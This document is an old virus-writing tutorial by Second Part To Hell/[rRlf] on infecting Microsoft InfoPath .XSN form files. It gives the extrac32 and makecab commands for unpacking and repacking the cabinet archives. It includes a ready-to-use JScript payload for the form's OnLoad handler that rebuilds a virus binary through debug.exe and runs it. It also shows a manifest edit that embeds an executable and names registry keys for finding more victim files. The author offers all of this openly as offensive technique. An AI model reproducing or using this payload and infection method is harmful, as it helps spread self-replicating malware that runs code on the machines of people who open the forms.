@@ -1,0 +1,398 @@
+
+	  *************************************************************
+	  *************************************************************
+	  ************                                      ***********
+	  ************     Computerviruses meet Infopath    ***********
+	  ************     by Second Part To Hell/[rRlf]    ***********
+	  ************                                      ***********
+	  *************************************************************
+	  *************************************************************
+
+
+  Index:
+  ******
+
+  0) Intro
+
+  1) How does InfoPath work
+
+  2) Infection Type I: Virus in script.js
+     a) Open a XSN file
+     b) Searching the infectable position
+     c) Dropping the binary virus code
+     d) Re-generating the XSN file
+
+  3) Infection Type II: Virus in Cabinet-Archive
+     a) Modify manifest.XSF
+     b) The Problem: Executing the code
+
+  4) Find more Files
+
+  5) Last words
+
+
+
+
+
+
+
+  0) Intro
+
+     Microsoft Office Infopath has been released in Office 2003. It is a XML
+     based interactive formulare-genation tool. Infopath works perfectly
+     together with Microsoft Windows SharePoint Server and Microsoft Office
+     SharePoint Services. You can import and export data via MS-SQL or XML
+     files, if you prefer that. You can create connections between objects very
+     easiely and you can make anything automatic with scripts behind the
+     document. When I had to learn Infopath, I sat there with a 500 pages book,
+     and was quite bored. When I read about Infopath-Macros, I thought about
+     doing something more interesting... I wrote a virus that infects Infopath
+     XSN files. And here we are...
+
+
+
+
+
+  1) How does InfoPath work
+
+     Infopath file-extantion is .XSN. These files are simple Cabinet Archives.
+     When we open such an archive, we can see manifest.xsf (more about it later),
+     several XML files, XSD (XML schema files), XSL (XML Stylesheet files), GIFs,
+     and highly probably a file called script.js. In the Cabinett archive, the
+     manifest.xsf has to be the first compressed file. This file contains (in XML
+     language) the data about all other files in the archive.
+     That means, Infopath decompresses the cabinet-file (XSN) and opens the
+     manifest.xsf to organize the formulare. Now, for viruses it's important that
+     you can write macros and create functions behind every object. This program
+     does not use simple VBA as all other Office products use, but it uses eighter
+     VBS or JS (which is used by default - and every sample code about Infopath I
+     could find has been written in JS). When I read a little bit about this macros,
+     I feeled like they wanted us to write viruses for it. The JS is able to use
+     ActiveX (including new objects as 'FileSystemObject' or 'WScript.Shell'), and
+     more important: An empty onload-function is included in every script.js
+     in case at least one time the (included) Script-Editor has been opened. Very
+     nice - thanks to the Infopath structure-creator! :D
+
+
+
+
+
+  2) Infection Type I: Virus in script.js
+
+     This infection type has been done by me in my first infopath-virus. Let's say
+     the virus is an .exe file. It searchs for .XSN files whereever it wants.
+     If it finds a file, the file will be opened...
+
+
+
+     a) Open a XSN file
+
+        This is not as simple as it may sound. As I've already written, XSN files
+        are archives, and we have to extract them. But per fortuna Microsoft provides
+        an very helpful (but annoying buggy) tool by default in every windows version
+        that I have tested (Windows NT, Windows 2000, Windows XP and Windows 2003).
+        The tool can be found at '%system%\extrac32.exe', and it is undocumented,
+        which means that you can not find any information about it by commandline
+        (for example: 'extrac32 /?'). By searching some time at the internet, we found
+        the parameters for extracting .CAB files:
+
+        - - -
+        %system%\extrac32.exe /e /a %filename%
+        - - -
+
+        %system%: Represents the path of the system-directory (for example: 'C:\WinNT\system32\')
+        %filename%: The filename of the cabinet-file, which should be extracted.
+
+        When you run that command, the file will be extracted in the current directory.
+        (Note: The extrac32.exe contains a very annoying bug: If one of the decompressed
+        files already exists in the current directory, it creates an infinitive loop and
+        starts using 100% CPU speed).
+
+
+
+     b) Searching the infectable position
+
+        I've already mentioned that the file we need is script.js. For understanding this
+        file better, you'll see the original (beside of the OnClick-Event) empty file:
+
+ - - - - - - - - - - - - - - - - - [Empty script.js] - - - - - - - - - - - - - - - - -
+/*
+ * This file contains functions for data validation and form-level events.
+ * Because the functions are referenced in the form definition (.xsf) file, 
+ * it is recommended that you do not modify the name of the function,
+ * or the name and number of arguments.
+ *
+*/
+
+// The following line is created by Microsoft Office InfoPath to define the prefixes
+// for all the known namespaces in the main XML data file.
+// Any modification to the form files made outside of InfoPath
+// will not be automatically updated.
+//<namespacesDefinition>
+XDocument.DOM.setProperty("SelectionNamespaces", 'xmlns:my="http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11"');
+//</namespacesDefinition>
+
+
+//=======
+// The following function handler is created by Microsoft Office InfoPath.
+// Do not modify the name of the function, or the name and number of arguments.
+//=======
+function CTRL1_5::OnClick(eventObj)
+{
+	// Write your code here
+}
+
+function XDocument::OnLoad(eventObj)
+{
+	// Write your code here
+}
+ - - - - - - - - - - - - - - - - -[Empty script.js] - - - - - - - - - - - - - - - - -
+
+        Now we know how the file looks, and how to get the position of the infectable function:
+        We simply search for the string: 'XDocument::OnLoad(eventObj)'. By that, we find the
+        OnLoad event of the current-Document-object. This is exactly what we need.
+
+
+
+     c) Dropping the binary virus code
+
+        After finding the pointer to infect, we can drop the code of our binary now. In real,
+        this is not as easy as it sounds. JScript has been designed to be "secure", and can
+        not handle binary data - in theory. But per fortuna Microsoft has installed a tool
+        by default, which will help us manage that problem: debug.exe (mille grazie per
+        SlageHammer! +g+). For that, we have to convert the binary virus code to hex code,
+        and insert it into a JScript - which will look like this:
+
+
+ - - - - - - - - - - - - - - - - - [Ready to drop JScript] - - - - - - - - - - - - - - - - - 
+var fso,shell,nxln,wsc,filee;
+nxln=String.fromCharCode(13,10);
+fso=new ActiveXObject("Scripting.FileSystemObject");
+file=fso.CreateTextFile("C:\\virus.txt", true);
+file.Write("e 0100 4D 5A 80 00 .....\nrcx\nFILESIZE\nn C:\\virus.dmp\nw\nq");
+file.Close();
+shell=new ActiveXObject("WScript.Shell");filee=fso.CreateTextFile("C:\\test.bat");
+filee.Write("debug<C:\\virus.txt"+nxln+"ren C:\\virus.dmp C:\\virus.exe");
+filee.Close();
+shell.Run("C:\\test.bat");
+/*
+ * Here you have to have something that waits ~1 second,
+ * because the .BAT file has to finish before doing anything else.
+ * suggestions: 'for (i=0; i<1000000; i++) {}' or something like that
+ *
+*/
+if (fso.FileExists("C:\\virus.exe")) { fso.DeleteFile("C:\\virus.exe"); }
+if (fso.FileExists("C:\\test.bat")) { fso.DeleteFile("C:\\test.bat"); }
+if (fso.FileExists("C:\\virus.DMP")) { fso.CopyFile("C:\\virus.DMP","C:\\virus.exe"); }
+if (fso.FileExists("C:\\virus.DMP")) { fso.DeleteFile("C:\\virus.DMP"); }
+shell.Run("C:\\virus.exe");
+ - - - - - - - - - - - - - - - - - [Ready to drop JScript] - - - - - - - - - - - - - - - - - 
+
+        We generate and execute a file called virus.exe at C:\. It seems like C:\ would be
+        the current directory for the file now - and it searchs for files in there - but
+        that is not true. The file-process has been created by the Infopath formular macro,
+        and the .exe has the Current Directory (GetCurrentDiretory) as the running .XSN file.
+        This is a very great advantage for viruswriting, otherwise we would have had to search
+        for more files in an other way.
+
+
+
+     d) Re-generating the XSN file
+
+        After successful infection of the script.JS, we have to pack them again into
+        a cabinet archive. Sounds like brainfuck - but isn't :-) Microsoft has once more
+        provided a installed-by-default tool (in all Windows versions I've tested), which
+        will do most of our work. The tool we have found is called makecab.exe. Here a
+        short explanation of itself:
+
+ - - - - - - - - - - - - - - - - - [MAKECAB explains itself] - - - - - - - - - - - - - - - - -
+Microsoft (R) Cabinet Maker - Version 5.1.2600.2180
+Copyright (c) Microsoft Corporation. All rights reserved..
+
+MAKECAB [/V[n]] [/D var=value ...] [/L dir] source [destination]
+MAKECAB [/V[n]] [/D var=value ...] /F directive_file [...]
+
+  source         File to compress.
+  destination    File name to give compressed file.  If omitted, the
+                 last character of the source file name is replaced
+                 with an underscore (_) and used as the destination.
+  /F directives  A file with MakeCAB directives (may be repeated).
+  /D var=value   Defines variable with specified value.
+  /L dir         Location to place destination (default is current directory).
+  /V[n]          Verbosity level (1..3).
+ - - - - - - - - - - - - - - - - - [MAKECAB explains itself] - - - - - - - - - - - - - - - - -
+
+        We see that we have to use 'MAKECAB /F directive_file', as we need to pack more
+        than one file. OK, but what the hell is a directive file?
+        Microsoft MAKECAB SDK (yes, something like that happens +g+) explains us that
+        a directive file contains the filenames and the order of filenames which should
+        be packed. As I've mentioned somewhere above, manifest.xsf has o be the first file,
+        the further order is not important. This is a directive-file of a simple XSN file:
+
+        directive.txt:
+        - - -
+        manifest.xsf
+        myschema.xsd
+        sampledata.xml
+        script.js
+        template.xml
+        view1.xsl
+        - - -
+
+        Now we can use the command 'MAKECAB /f directive.txt' - and immediatly a new .cab
+        file has been created in the default directory with default filename: 'disk1/1.cab'.
+        Finally, we can remove the old, uninfected XSN file with the new one.
+
+
+
+
+
+  3) Infection Type II: Virus in Cabinet-Archive
+
+     This is another infection type of XSN files, but still I dont know if it is
+     fully possible. Advantage: No need of debug.exe...
+     At this idea we don't drop the hex-code of the binary virus in the script.js,
+     but copy the virus.exe itself into the archive, and modify manifest.xsf and
+     script.js.
+
+     a) Modify manifest.XSF
+
+        As every file of the archive has to be in the XML Form (manifest.xsf) File, we have to
+        add our file too. First let's see a standard manifest.XSF file:
+
+ - - - - - - - - - - - - - - - - - [manifest.XSF] - - - - - - - - - - - - - - - - -
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+This file is automatically created and modified by Microsoft Office InfoPath.
+Changes made to the file outside of InfoPath might be lost if the form template is modified in InfoPath.
+-->
+<xsf:xDocumentClass publishUrl="E:\temp\Template1.xsn" solutionVersion="1.0.0.3" productVersion="11.0.5531" solutionFormatVersion="1.0.0.0" xmlns:xsf="http://schemas.microsoft.com/office/infopath/2003/solutionDefinition" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:xd="http://schemas.microsoft.com/office/infopath/2003" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:my="http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11">
+	<xsf:package>
+		<xsf:files>
+			<xsf:file name="myschema.xsd">
+				<xsf:fileProperties>
+					<xsf:property name="namespace" type="string" value="http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11"></xsf:property>
+					<xsf:property name="editability" type="string" value="full"></xsf:property>
+					<xsf:property name="rootElement" type="string" value="myFields"></xsf:property>
+				</xsf:fileProperties>
+			</xsf:file>
+			<xsf:file name="template.xml"></xsf:file>
+			<xsf:file name="sampledata.xml">
+				<xsf:fileProperties>
+					<xsf:property name="fileType" type="string" value="sampleData"></xsf:property>
+				</xsf:fileProperties>
+			</xsf:file>
+			<xsf:file name="view1.xsl">
+				<xsf:fileProperties>
+					<xsf:property name="lang" type="string" value="1031"></xsf:property>
+					<xsf:property name="viewWidth" type="string" value="542px"></xsf:property>
+					<xsf:property name="componentId" type="string" value="1"></xsf:property>
+				</xsf:fileProperties>
+			</xsf:file>
+			<xsf:file name="script.js">
+				<xsf:fileProperties>
+					<xsf:property name="scriptType" type="string" value="userEvents"></xsf:property>
+				</xsf:fileProperties>
+			</xsf:file>
+		</xsf:files>
+	</xsf:package>
+	<xsf:importParameters enabled="yes"></xsf:importParameters>
+	<xsf:documentVersionUpgrade>
+		<xsf:useTransform transform="" minVersionToUpgrade="0.0.0.0"></xsf:useTransform>
+	</xsf:documentVersionUpgrade>
+	<xsf:views default="View 1">
+		<xsf:view name="View 1" caption="View 1">
+			<xsf:unboundControls>
+				<xsf:button name="CTRL1_5"></xsf:button>
+			</xsf:unboundControls>
+			<xsf:mainpane transform="view1.xsl"></xsf:mainpane>
+		</xsf:view>
+	</xsf:views>
+	<xsf:applicationParameters application="InfoPath Design Mode">
+		<xsf:solutionProperties lastOpenView="view1.xsl" fullyEditableNamespace="http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11" scriptLanguage="jscript"></xsf:solutionProperties>
+	</xsf:applicationParameters>
+	<xsf:documentSchemas>
+		<xsf:documentSchema rootSchema="yes" location="http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11 myschema.xsd"></xsf:documentSchema>
+	</xsf:documentSchemas>
+	<xsf:fileNew>
+		<xsf:initialXmlDocument caption="Template1" href="template.xml"></xsf:initialXmlDocument>
+	</xsf:fileNew>
+	<xsf:scripts language="jscript">
+		<xsf:script src="script.js"></xsf:script>
+	</xsf:scripts>
+</xsf:xDocumentClass>
+ - - - - - - - - - - - - - - - - - [manifest.XSF] - - - - - - - - - - - - - - - - -
+
+        First you can see, that this file is UTF-8 (as any file generated by Infopath). This may be
+        important if you want to modify that file.
+        As you can see too, it is not important that <xsf:file>-tags contain further information.
+        That means, we can simply add a string "<xsf:file name="virus.exe"></xsf:file>" to the file,
+        and Infopath will accept it.
+
+
+
+     b) The Problem: Executing the code
+
+        I have not found a solution for that so far, but somehow i'm sure it exists (as anything
+        is that unsecure in Infopath). The idea is to create a script in the OnLoad-Event (again)
+        and execute the virus.exe. Problem: I hav enot found a way to find, where the files of the
+        archive will be extracted temporaryly. Second idea: Script.js generates a .JS file, which
+        extracts the archive by itself and runs the virus.exe then. Problem: When the .JS file is
+        dropped at a hardcoded path, it does not "know" where the archive was. (I was not able to
+        find out a way that the script.js in the XSN file "knows" where it is.) When the file will
+        be generated at a non-hardcoded path, it will be the system-path, and the same problem happens
+        again. Maybe somebody else finds a solution and can use the rest of the idea then.
+
+
+
+
+
+  4) Find more Files
+
+     So far I have just written about infection types. But we also have to find infectable files.
+     And current-directory is good enough for a proof-of-concept virus, but not for further
+     experiences with Infopath.
+     When I was searching for infectable victims, I used the Registry, and found some very useful
+     Registry-Pathes:
+
+     HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\InfoPath\Recent File List
+
+     This key contains values of Filenames. The valuename is "File n" where x is a number.
+     You can read it out and infect that file. And as documents are often saved in the same
+     directory, you should also use a full directory-search.
+
+     HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\xsn
+
+     That key contains a list of the recently used XSN files. There is a value called MRUList,
+     which contains all letters of further values, which contains files - like that:
+
+     - - -
+     a [C:\Windows\System32\victim1.xsn]
+     b [D:\Documents and Settings\victim2.xsn]
+     MRUList [ab]
+     - - -
+
+     This may also be a nice way to find further files.
+
+
+
+
+
+  5) Last words
+
+     This is just the beginning of a very big amount of technique, released by Microsoft recently,
+     for online/web-orientated teamworking. Things like Windows SharePoint Server/Office SharePoint
+     Services are great developements - and also provide much coding (webparts, ect). MS FrontPage
+     (which will be called "SharePoint Designer 2007" soon) has a great new amount of features,
+     which could also become victims. There is much to discover and to develope - we will not rest
+     until any infectable file is infected :-)
+
+
+                                                  - - - - - - - - - - - - - - -
+                                                    Second Part To Hell/[rRlf]  
+                                                    www.spth.de.vu
+                                                    spth@priest.com
+                                                    written in February-March 2006
+
+                                                    ...surrealistic viruswriter...
+                                                  - - - - - - - - - - - - - - -
